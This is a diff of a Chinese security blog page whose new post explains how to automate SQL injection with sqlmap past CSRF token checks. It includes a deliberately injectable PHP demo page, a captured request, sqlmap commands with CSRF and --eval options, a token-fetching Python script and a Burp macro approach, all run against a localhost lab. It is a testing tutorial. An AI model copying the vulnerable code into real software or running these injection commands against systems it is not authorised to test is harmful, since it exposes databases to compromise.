@@ -4,25 +4,25 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>burp错误解决 | MSAREHERE</title>
+    <title>sqlmap+burp绕过csrf | MSAREHERE</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="MS">
     
 
     
-    <meta name="description" content="burp抓https包出现页面无返回情况">
-<meta name="keywords" content="Burp,HTTPS,错误">
+    <meta name="description" content="目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。针对后两种遇到了注入点，如何自动化利用sqlmap注入呢？">
+<meta name="keywords" content="注入,CSRF,BURP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="burp错误解决">
-<meta property="og:url" content="https://michaelwayneliu.github.io/2018/01/13/burp错误解决/index.html">
+<meta property="og:title" content="sqlmap+burp绕过csrf">
+<meta property="og:url" content="https://michaelwayneliu.github.io/2018/08/28/sqlmap-burp绕过csrf/index.html">
 <meta property="og:site_name" content="MSAREHERE">
-<meta property="og:description" content="burp抓https包出现页面无返回情况">
+<meta property="og:description" content="目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。针对后两种遇到了注入点，如何自动化利用sqlmap注入呢？">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-01-13T01:47:50.332Z">
+<meta property="og:updated_time" content="2018-08-28T03:21:47.585Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="burp错误解决">
-<meta name="twitter:description" content="burp抓https包出现页面无返回情况">
+<meta name="twitter:title" content="sqlmap+burp绕过csrf">
+<meta name="twitter:description" content="目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。针对后两种遇到了注入点，如何自动化利用sqlmap注入呢？">
 
     
     <link rel="alternative" href="/atom.xml" title="MSAREHERE" type="application/atom+xml">
@@ -86,14 +86,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/01/13/burp错误解决/" title="burp错误解决" itemprop="url">burp错误解决</a>
+      <a href="/2018/08/28/sqlmap-burp绕过csrf/" title="sqlmap+burp绕过csrf" itemprop="url">sqlmap+burp绕过csrf</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="MS" target="_blank" itemprop="author">MS</a>
 		
   <p class="article-time">
-    <time datetime="2018-01-13T01:35:29.000Z" itemprop="datePublished"> 发表于 2018-01-13</time>
+    <time datetime="2018-08-28T03:20:31.000Z" itemprop="datePublished"> 发表于 2018-08-28</time>
     <span id="busuanzi_container_page_pv">
     总阅读<span id="busuanzi_value_page_pv"></span>次
 </span>
@@ -104,13 +104,30 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap自带功能"><span class="toc-number">1.</span> <span class="toc-text"><a href="#sqlmap&#x81EA;&#x5E26;&#x529F;&#x80FD;" class="headerlink" title="sqlmap&#x81EA;&#x5E26;&#x529F;&#x80FD;"></a>sqlmap&#x81EA;&#x5E26;&#x529F;&#x80FD;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方法1"><span class="toc-number">1.1.</span> <span class="toc-text"><a href="#&#x65B9;&#x6CD5;1" class="headerlink" title="&#x65B9;&#x6CD5;1"></a>&#x65B9;&#x6CD5;1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法2"><span class="toc-number">1.2.</span> <span class="toc-text"><a href="#&#x65B9;&#x6CD5;2" class="headerlink" title="&#x65B9;&#x6CD5;2"></a>&#x65B9;&#x6CD5;2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#burp的宏"><span class="toc-number">2.</span> <span class="toc-text"><a href="#burp&#x7684;&#x5B8F;" class="headerlink" title="burp&#x7684;&#x5B8F;"></a>burp&#x7684;&#x5B8F;</span></a></li></ol>
 		
 		</div>
 		
-		<p>burp抓https包出现页面无返回情况<br><a id="more"></a><br>burp抓https包出现页面无返回情况，F12定位资源请求发现某个页面的返回头中X-Frame-Options值设为DENY，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options" target="_blank" rel="noopener">参考</a><br>单独请求该资源，得到错误<strong>handshake alert: unrecognized_name</strong>，google之，是SSL在JAVA7中的实现问题，使用如下命令启动burp，解决</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djsse.enableSNIExtension=false -jar burpsuite_pro_v1.X.jar</span><br></pre></td></tr></table></figure>
-<p>这会禁止服务器名称暗示扩展–Server Name Indication (SNI) extension，让JAVA忽略Unrecognized Name这个错误。在user options–&gt;SSL也可以Disable Java SNI extension</p>
+		<p>目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。针对后两种遇到了注入点，如何自动化利用sqlmap注入呢？<br><a id="more"></a><br>目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。针对后两种遇到了注入点，如何自动化利用sqlmap注入呢？</p>
+<p>比如说下面这种情况，存在注入点，但是会验证token：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">* PHP简单利用token防止表单重复提交</span><br><span class="line">* 此处理方法纯粹是为了给初学者参考</span><br><span class="line">*/</span><br><span class="line">session_start();</span><br><span class="line">// var_dump($_REQUEST);</span><br><span class="line">function set_token() &#123;</span><br><span class="line">    $_SESSION[&apos;token&apos;] = md5(microtime(true));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function valid_token() &#123;</span><br><span class="line">    $return = $_REQUEST[&apos;token&apos;] === $_SESSION[&apos;token&apos;] ? true : false;</span><br><span class="line">    set_token();</span><br><span class="line">    return $return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//如果token为空则生成一个token</span><br><span class="line">if(!isset($_SESSION[&apos;token&apos;]) || $_SESSION[&apos;token&apos;]==&apos;&apos;) &#123;</span><br><span class="line">    set_token();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error_reporting(E_USER_ERROR | E_USER_WARNING | E_USER_NOTICE);</span><br><span class="line">@mysql_connect(&quot;127.0.0.1&quot;.&apos;:&apos;.&quot;3306&quot;,root,&apos;root&apos;)</span><br><span class="line">or die(&quot;数据库服务器连接失败&quot;);   </span><br><span class="line">@mysql_select_db(&apos;mysql&apos;)</span><br><span class="line">or die(&quot;数据库不存在或不可用&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;id&apos;]))&#123;</span><br><span class="line">    if(!valid_token())&#123;</span><br><span class="line">        echo &quot;token error&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //echo &apos;成功提交，Value:&apos;.$_POST[&apos;test&apos;];</span><br><span class="line">        $id=$_REQUEST[id];</span><br><span class="line">        $sql=&apos;select * from mysql.user where user=&apos;.&quot;&apos;&quot;.$id.&quot;&apos;&quot;.&apos; limit 0,1;&apos;;</span><br><span class="line">        echo $sql;</span><br><span class="line">        mysql_query($sql);</span><br><span class="line">        $set_result = mysql_query($sql); </span><br><span class="line">        while($row =mysql_fetch_array($set_result))&#123;</span><br><span class="line">            $result[]=$row;</span><br><span class="line">        &#125;</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//echo &quot;SESSION &quot;.$_SESSION[&apos;token&apos;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?php echo $_SESSION[&apos;token&apos;]?&gt;&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;root&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="sqlmap自带功能"><a href="#sqlmap自带功能" class="headerlink" title="sqlmap自带功能"></a>sqlmap自带功能</h3><p>burp抓个包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /test/csrf_test/csrf.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://127.0.0.1/test/csrf_test/csrf.php?id=root</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 46</span><br><span class="line">Cookie: PHPSESSID=o39l0bgbei6lfjn0pg0tu0ghl1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">token=82e50c9428a2b659f9fba799e8f80bec&amp;id=root</span><br></pre></td></tr></table></figure></p>
+<p>现在的目的是只要能把获取到的token放到post请求就OK~</p>
+<h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>最新版sqlmap1.2.8.15#dev良好支持csrf注入，它会自动先get请求一次页面，拿到给定参数的值后再进行注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 5.txt --csrf-token=&quot;token&quot; --csrf-url=&quot;http://127.0.0.1/test/csrf_test/csrf.php&quot;  --dbms mysql --level 5 -p id --proxy http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+<h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>使用sqlmap的–eval参数在发送请求前先执行我们构造的脚本，就可以把获取到的token带进去。</p>
+<p>执行的脚本示例如下，一定要带上你的cookie，这个是后端“跟踪”你的凭证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests,re;</span><br><span class="line">def get_token():</span><br><span class="line">	cookies=&#123;&apos;PHPSESSID&apos;: &apos;o39l0bgbei6lfjn0pg0tu0ghl1&apos;&#125;</span><br><span class="line">	r=requests.get(&apos;http://127.0.0.1/test/csrf_test/csrf.php&apos;,cookies=cookies);</span><br><span class="line">	token=re.search(&apos;token&quot; value=&quot;(.*?)&quot;&apos;,r.content).group(1);</span><br><span class="line">	return token</span><br></pre></td></tr></table></figure>
+<p>把burp抓到的包保存为1.txt，把eval 的脚本保存为 csrf.py，然后执行sqlmap</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --eval=&quot;import csrf;token=csrf.get_token()&quot; --dbms mysql --level 5 -p id</span><br></pre></td></tr></table></figure>
+<h3 id="burp的宏"><a href="#burp的宏" class="headerlink" title="burp的宏"></a>burp的宏</h3><p>burp的宏会记录通信过程，找到上下文关系中可能存在的一些依赖。比如token，上一次请求拿到的token下一次请求时得带上这个token。<br>具体配置参考这篇<a href="http://www.freebuf.com/articles/web/156735.html" target="_blank" rel="noopener">文章</a>就可以，这里就不赘述了。<br>最后一条命令搞定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt  --dbms mysql --level 5 -p id --proxy http://127.0.0.1:8080</span><br></pre></td></tr></table></figure></p>
+<p>美滋滋。</p>
+<p>参考链接：<br><a href="https://blog.csdn.net/u011066706/article/details/51175351" target="_blank" rel="noopener">https://blog.csdn.net/u011066706/article/details/51175351</a></p>
+<p><a href="https://www.cyberis.co.uk/burp_macros.html" target="_blank" rel="noopener">https://www.cyberis.co.uk/burp_macros.html</a></p>
+<p><a href="https://my.oschina.net/oby/blog/847522" target="_blank" rel="noopener">https://my.oschina.net/oby/blog/847522</a></p>
+<p><a href="http://www.freebuf.com/articles/web/156735.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/156735.html</a></p>
+<p><a href="http://www.freebuf.com/sectool/128589.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/128589.html</a></p>
+<p><a href="http://www.vuln.cn/7009" target="_blank" rel="noopener">http://www.vuln.cn/7009</a></p>
   
 	</div>
 
@@ -119,13 +136,13 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/工具/">工具</a>
+  <a class="article-category-link" href="/categories/后端安全/">后端安全</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/Burp/">Burp</a><a href="/tags/HTTPS/">HTTPS</a><a href="/tags/错误/">错误</a>
+  <span></span> <a href="/tags/注入/">注入</a><a href="/tags/CSRF/">CSRF</a><a href="/tags/BURP/">BURP</a>
   </div>
 
 </div>
@@ -134,7 +151,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="https://michaelwayneliu.github.io/2018/01/13/burp错误解决/" data-title="burp错误解决 | MSAREHERE" data-tsina="2639885925" class="share clearfix">
+	  <div data-url="https://michaelwayneliu.github.io/2018/08/28/sqlmap-burp绕过csrf/" data-title="sqlmap+burp绕过csrf | MSAREHERE" data-tsina="2639885925" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -148,18 +165,18 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2018/01/13/opcache那些事/" title="opcache那些事">
+ <a href="/2018/08/28/JS内网主机扫描和端口扫描姿势总结/" title="JS内网主机扫描和端口扫描姿势总结">
   <strong>上一篇：</strong><br/>
   <span>
-  opcache那些事</span>
+  JS内网主机扫描和端口扫描姿势总结</span>
 </a>
 </div>
 
 
 <div class="next">
-<a href="/2018/01/12/service-worker-xss进化/"  title="service worker--xss进化">
+<a href="/2018/08/28/XXE攻击那些事/"  title="XXE攻击那些事">
  <strong>下一篇：</strong><br/> 
- <span>service worker--xss进化
+ <span>XXE攻击那些事
 </span>
 </a>
 </div>
@@ -203,7 +220,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap自带功能"><span class="toc-number">1.</span> <span class="toc-text"><a href="#sqlmap&#x81EA;&#x5E26;&#x529F;&#x80FD;" class="headerlink" title="sqlmap&#x81EA;&#x5E26;&#x529F;&#x80FD;"></a>sqlmap&#x81EA;&#x5E26;&#x529F;&#x80FD;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方法1"><span class="toc-number">1.1.</span> <span class="toc-text"><a href="#&#x65B9;&#x6CD5;1" class="headerlink" title="&#x65B9;&#x6CD5;1"></a>&#x65B9;&#x6CD5;1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法2"><span class="toc-number">1.2.</span> <span class="toc-text"><a href="#&#x65B9;&#x6CD5;2" class="headerlink" title="&#x65B9;&#x6CD5;2"></a>&#x65B9;&#x6CD5;2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#burp的宏"><span class="toc-number">2.</span> <span class="toc-text"><a href="#burp&#x7684;&#x5B8F;" class="headerlink" title="burp&#x7684;&#x5B8F;"></a>burp&#x7684;&#x5B8F;</span></a></li></ol>
  
   </div>
 
